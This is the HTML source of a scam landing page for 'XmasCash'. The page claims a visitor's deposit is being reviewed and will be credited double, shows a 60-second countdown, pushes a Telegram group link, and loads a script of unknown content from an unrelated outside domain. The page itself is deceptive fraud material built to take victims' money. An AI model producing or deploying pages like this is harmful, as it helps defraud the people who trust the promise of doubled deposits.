<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>XmasCash Countdown</title>
  <style>
    /* General Styles */
body {
  margin: 0;
  padding: 0;
  font-family: Arial, sans-serif;
  background: linear-gradient(135deg, #6a11cb, #2575fc);
  color: #fff;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  overflow: hidden;
}

/* Container */
.container {
  text-align: center;
  background: rgba(255, 255, 255, 0.1);
  border-radius: 15px;
  padding: 20px;
  width: 90%;
  max-width: 400px;
  box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
  animation: fadeIn 2s ease-out;
}

/* Title */
.title {
  font-size: 24px;
  font-weight: bold;
  margin-bottom: 20px;
  text-transform: uppercase;
  letter-spacing: 1px;
  color: #f5f5f5;
}

/* Message */
.message p {
  font-size: 16px;
  margin-bottom: 10px;
}

.message .telegram-link {
  display: inline-block;
  background: #2575fc;
  color: #fff;
  text-decoration: none;
  padding: 10px 15px;
  border-radius: 5px;
  font-size: 14px;
  font-weight: bold;
  transition: all 0.3s ease;
}

.message .telegram-link:hover {
  background: #6a11cb;
  box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
}

/* Countdown */
.countdown {
  margin-top: 20px;
  font-size: 18px;
}

#timer {
  font-size: 32px;
  font-weight: bold;
  color: #f0ff00;
}

/* Animations */
@keyframes fadeIn {
  from {
    opacity: 0;
    transform: scale(0.9);
  }
  to {
    opacity: 1;
    transform: scale(1);
  }
}
  </style>
</head>
<body>
  <div class="container">
    <h1 class="title">XmasCash Deposit Review</h1>
    <div class="message">
      <p>XmasCash is reviewing your deposit, and will credit you double if your deposit was successful.</p>
      <p>While you wait, join the Telegram Group:</p>
      <a href="https://t.me/opaygi" target="_blank" class="telegram-link">Click Here</a>
    </div>
    <div class="countdown">
      <p>Time Remaining:</p>
      <span id="timer">60</span>s
    </div>
  </div>
  <script>
    // Countdown Timer Logic
let timer = 60; // Initial countdown time in seconds
const timerElement = document.getElementById('timer');

const countdown = setInterval(() => {
  timer--;
  timerElement.textContent = timer;

  if (timer === 0) {
    clearInterval(countdown);
    alert("Time Elapsed! Check your Transaction status.");
  }
}, 1000);
  </script>

  <script type='text/javascript' src='//slushhelmetmirth.com/39/2a/0d/392a0d28346a0e19cd71e87eccfdecf0.js'></script>
  
</body>
</html>
